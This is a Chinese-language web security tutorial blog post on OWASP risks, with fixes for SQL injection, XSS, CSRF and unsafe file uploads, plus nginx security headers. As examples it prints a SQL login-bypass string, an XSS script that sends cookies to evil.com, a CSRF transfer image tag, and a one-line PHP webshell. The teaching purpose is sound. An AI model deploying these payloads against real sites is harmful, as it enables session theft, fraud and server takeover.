---
title: 网站常见安全漏洞与防范——2026 年，你的网站还在裸奔吗？
categories: Web开发
tags: [网络安全,漏洞防范,XSS,SQL注入,CSRF,OWASP,安全头]
date: 2020-06-11 14:38:20
updated: 2026-07-24 10:00:00
id: 0015
---

我前年帮一个朋友的电商站做安全审计，结果触目惊心：

- 密码用 MD5 存储（MD5 是什么水平的加密？2010 年就被破解了）
- 没有 CSP 头（攻击者可以直接注入任意脚本）
- 后台地址是 `/admin`（三天内被扫描到了 200 多次尝试登录）
- 文件上传不做类型校验（意味着上传一个 PHP 文件就能直接 getshell）

他说："这样用了 5 年，没出过事啊。"

我说："不是没出事，是**还没有人认真地来搞你。**"

**一句话理解：** 网站安全不是"会不会被攻击"的问题，是"什么时候被攻击"的问题——你能做的，是让攻击者觉得搞你太麻烦，转而去找下一个目标。

## OWASP Top 10：行业公认的安全清单

OWASP（开放Web应用程序安全项目）每年发布一次 Top 10 安全风险列表。这是行业通用的安全参考标准。以下是 2026 年最需要关注的几类：

| 风险 | 严重程度 | 常见场景 |
|------|---------|---------|
| 注入攻击（含 SQL 注入） | 🔴 高危 | 搜索框、登录框 |
| 认证失效 | 🔴 高危 | 弱密码、Session 固定 |
| XSS（跨站脚本） | 🔴 高危 | 评论区、用户输入展示 |
| 敏感数据泄露 | 🟡 中危 | 密码明文传输、日志泄漏 |
| 访问控制缺陷 | 🟡 中危 | 越权访问后台 |
| SSRF（服务端请求伪造） | 🟡 中危 | 图片下载、URL 抓取功能 |

下面展开最常见的几种。

## 1. SQL 注入：最古老也最致命的漏洞

攻击者在输入框里写一段 SQL 代码，如果后端没做处理，这个 SQL 就会在数据库里执行。

```sql
-- 正常输入：输入 username = "admin"
SELECT * FROM users WHERE username = 'admin';

-- 恶意输入：输入 username = "admin' OR '1'='1"
SELECT * FROM users WHERE username = 'admin' OR '1'='1';
-- 这条 SQL 会返回所有用户，登录验证就失效了
```

**正确做法：使用参数化查询（Prepared Statement）**

```php
// ❌ 错误：拼接 SQL
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";

// ✅ 正确：参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```

> **经验之谈：** 我曾经在一个老项目里发现了一百多处拼接 SQL——那是十年前一个外包团队写的。全部改成参数化查询花了我整整一周。从那次之后我给自己定了个规矩：**项目中不允许出现任何拼接 SQL，所有数据库操作必须用 ORM 或参数化查询。**

## 2. XSS（跨站脚本攻击）：评论区是重灾区

```html
<!-- 攻击者在评论区写入： -->
<script>
  // 偷取用户的 cookie
  document.location='https://evil.com/steal?cookie='+document.cookie;
</script>

<!-- 如果输出时没有做 HTML 实体编码，所有看这条评论的用户都会中招 -->
```

**正确做法：对输出做 HTML 实体编码**

```html
<!-- 在服务器端对输出做编码 -->

<!-- 原始输入：<script>alert('xss')</script> -->
<!-- 编码后输出：&lt;script&gt;alert('xss')&lt;/script&gt; -->

<!-- 后者在浏览器里只会显示为普通文字，不会执行 -->
```

另外一种更强大的防御是 **Content Security Policy（CSP）**——直接告诉浏览器"这个页面只允许加载哪些来源的脚本"：

```nginx
# Nginx 配置 CSP 头
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https:;
" always;
```

CSP 的效果是：**即使攻击者注入了 `<script>` 标签，浏览器也不会执行——因为 CSP 说"不要执行来自这个来源的脚本"。**

## 3. CSRF（跨站请求伪造）：借你的手干坏事

你登录了银行网站（没退出），然后访问了一个恶意网站。恶意网站偷偷发了一个请求：

```html
<!-- 攻击者页面里隐藏的图片 -->
<img src="https://bank.com/transfer?amount=10000&to=attacker">

<!-- 因为你的登录 cookie 还在，浏览器会带上 cookie 发送这个请求 -->
<!-- 银行收到请求，认为是你本人操作，转了 10000 块 -->
```

**正确做法：使用 SameSite Cookie**

```php
// PHP 设置 SameSite Cookie
setcookie("session", $session_id, [
    'samesite' => 'Strict',  // 或 'Lax'
    'secure' => true,
    'httponly' => true,
]);
```

`SameSite=Strict` 意味着：**只有在用户直接访问本站时才会发送 cookie**，从其他网站点击链接或提交表单时不会带 cookie。这个属性 2026 年已经被所有主流浏览器支持了。

## 4. 安全头清单：一行配置顶得上千行代码

以下安全响应头，每一行都能防御一类攻击：

```nginx
# Nginx 安全头配置
add_header X-Frame-Options "SAMEORIGIN" always;           # 防止点击劫持（别人用 iframe 嵌入你的网站）
add_header X-Content-Type-Options "nosniff" always;        # 防止 MIME 类型混淆攻击
add_header X-XSS-Protection "0" always;                    # 废弃了，设为 0 避免问题
add_header Referrer-Policy "strict-origin-when-cross-origin" always;  # 控制 Referer 发送策略
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;  # 禁用不必要的 API
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;  # 强制 HTTPS
```

## 5. 文件上传：最容易忽略的后门

文件上传功能几乎是每个网站都会有的（头像、附件、图片）。如果对上传的文件不做严格检查，攻击者可以上传一个 PHP webshell：

```php
<?php system($_GET['cmd']); ?>
```

**防御措施：**

```php
// 1. 检查文件扩展名（白名单比黑名单靠谱）
$allowed = ['jpg', 'png', 'gif', 'webp'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die('不允许的文件类型');
}

// 2. 检查文件内容头（MIME Type）
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $uploaded_file);
if (strpos($mime, 'image/') !== 0) {
    die('只允许上传图片');
}

// 3. 上传目录不要有执行权限
// Nginx 取消上传目录的脚本执行权限
location /uploads {
    location ~ \.php$ { deny all; }
}
```

## 还有几个底线

| 事项 | 正确做法 | 错误做法 |
|------|---------|---------|
| 密码存储 | bcrypt/argon2 | MD5/SHA1/base64 |
| 传输加密 | HTTPS（Let's Encrypt） | HTTP |
| 后台地址 | 自定义路径如 `/dashboard` | 默认 `/admin` |
| 错误信息 | 自定义错误页 | 暴露堆栈信息 |
| 依赖安全 | 定期 `npm audit` / `composer audit` | 从不更新 |

## 相关推荐

- [什么是 SSL 和 HTTPS？——网站加密入门](/archives/0026/)
- [对付 DDoS 攻击的现代防御策略](/archives/0036/)
- [网站基础术语入门——安全部分](/archives/0018/)

**P.S.** 回到开头那个朋友的故事——那次安全审计之后，我帮他修了所有漏洞。两周后，他又被扫描攻击了一次，但这次攻击者只扫到了 403 和 404。攻击者放弃了。**安全不是要做到 100% 攻不破——做到 99% 的攻击者觉得"太麻烦"，你就已经赢了。**
